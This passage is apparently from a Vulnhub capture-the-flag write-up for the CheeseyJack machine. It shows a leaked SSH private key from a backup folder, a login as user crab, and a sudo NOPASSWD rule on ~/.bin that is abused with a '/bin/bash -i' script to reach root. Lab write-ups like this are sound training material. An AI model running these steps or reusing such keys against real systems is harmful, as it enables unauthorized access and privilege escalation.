tR7KV5Jd+FX3nZUGuhPHHZ+H18MPur5Qlxd/hNOCnYjZI2JK8AAADBAN0h7i6gokU6ivL6
rTushox/N4y2OgjLfK3eFnxFlrAx0gi5aOLYzi3tLeVI6IUHUYy6jPozvwykAvfkXAozPt
HUw2yCg/DIwwCn3MiYOQs8OkeGOuY9ZvsboPORRTgBOdXt+nBMfck8lAX/pG3AiHcQydVB
D0wWZ4U36cXG7il0FSzh3UykozGPU/ax2svjZB1UsbCNa0mNICfuFaVWRN7NSnNT2xcded
Dfgx8SkV2I+WmhfFbO/YkQ6X1xwigbYQAAAMEA0QlPVdkSRNT//VIEVKgDpj5nHxYR86oi
MwbRHOOCEJlY8l8l09KQtpD7eKdu2w2Lu5oZtJcOHfiLeuVD5tco7+Xe0/nu7WQhg+oJk3
WjkC55loKLSn2now5KOMNHWhmsKPjPhKXQL/NLU9gZQdamoTfijCNqZIitj8j2Xa6JGbMu
/8yv4FQuI2H0WjiQNCKZ1k/BeQcEwadBbMgdadztmTUqgLDMr/8uS64G717eQpOiOjaiYG
/3nSxtz2A7Pt2dAAAAC2NyYWJAdWJ1bnR1AQIDBAUGBw==
-----END OPENSSH PRIVATE KEY-----
www-data@cheeseyjack:/var/backups/ssh-bak$ 

```
Let's copy the contents of the SSH key and create a key on our Kali. We can then paste the content into the key and save it. Of course, the rights still have to be set correctly. If this is not done, we will receive a message that the permissions are not set correctly.
```bash
┌──(emvee㉿kali)-[~/Documents/Vulnhub/CheeceyJack]
└─$ nano priv.key 

┌──(emvee㉿kali)-[~/Documents/Vulnhub/CheeceyJack]
└─$ chmod 600 priv.key     
```

-----
## Privilege escalation
Time to try logging in with crab and the SSH key.
```bash
┌──(emvee㉿kali)-[~/Documents/Vulnhub/CheeceyJack]
└─$ ssh crab@$ip -i priv.key                                                                     
Welcome to Ubuntu 20.04.1 LTS (GNU/Linux 5.4.0-48-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage


86 updates can be installed immediately.
0 of these updates are security updates.
To see these additional updates run: apt list --upgradable


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Your Hardware Enablement Stack (HWE) is supported until April 2025.
Last login: Thu Sep 24 16:48:34 2020 from 172.16.24.128
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

crab@cheeseyjack:~$ 

```
We were able to successfully log in as a crab on the SSH service. Let's see if crab also has sudo rights.
```bash
crab@cheeseyjack:~$ sudo -l
Matching Defaults entries for crab on cheeseyjack:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User crab may run the following commands on cheeseyjack:
    (ALL : ALL) ALL
    (root) NOPASSWD: /home/crab/.bin/
crab@cheeseyjack:~$ 

```
We have sudo rights to everything in the following directory `/home/crab/.bin/`. Let's first see what's in this directory.
```bash
crab@cheeseyjack:~$ ls /home/crab/.bin/
ping
```
Let's create a bash script that starts an interactive shell. Then we need to set the permissions so that the file is executable. For convenience, I give all rights to everyone. This is not safe and you should not just do it in a production environment.
```bash
crab@cheeseyjack:~/.bin$ echo '/bin/bash -i' > root.sh
crab@cheeseyjack:~/.bin$ chmod 777 root.sh
```
Now that the file has the correct permissions we can run it as with sudo. If all goes well, an interactive shell will be started with elevated rights.
```bash
crab@cheeseyjack:~/.bin$ sudo ./root.sh 
```
We can enter commands again. Let's see who we are, what membership I have as user and what machine we are working on.
```bash
root@cheeseyjack:/home/crab/.bin# whoami;id;hostname;ifconfig
root
uid=0(root) gid=0(root) groups=0(root)
cheeseyjack
enp0s17: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.0.2.42  netmask 255.255.255.0  broadcast 10.0.2.255
        inet6 fe80::adbd:6430:362e:1957  prefixlen 64  scopeid 0x20<link>
        ether 08:00:27:e1:b2:df  txqueuelen 1000  (Ethernet)
        RX packets 1614  bytes 416890 (416.8 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 1283  bytes 184056 (184.0 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 137  bytes 12746 (12.7 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 137  bytes 12746 (12.7 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

root@cheeseyjack:/home/crab/.bin# ls /root
root.txt
```
Looks like we're root and it's time to capture the root flag!
```bash
root@cheeseyjack:/home/crab/.bin# cat /root/root.txt
                    ___ _____
                   /\ (_)    \
                  /  \      (_,
                 _)  _\   _    \
                /   (_)\_( )____\
                \_     /    _  _/
                  ) /\/  _ (o)(
                  \ \_) (o)   /
                   \/________/    


WOWWEEEE! You rooted my box! Congratulations. If you enjoyed this box there will be more coming.

Tag me on twitter @cheesewadd with this picture and i'll give you a RT!


```
Well, since the machine was owned fully and I forgot to see what Linux distro and kernel was used, I had to execute some commands to make my notes complete.
```bash
root@cheeseyjack:/home/crab/.bin# uname -a
Linux cheeseyjack 5.4.0-48-generic #52-Ubuntu SMP Thu Sep 10 10:58:49 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
root@cheeseyjack:/home/crab/.bin# uname -mrs
Linux 5.4.0-48-generic x86_64
root@cheeseyjack:/home/crab/.bin# cat /etc/issue
Ubuntu 20.04.1 LTS \n \l

root@cheeseyjack:/home/crab/.bin# 

```

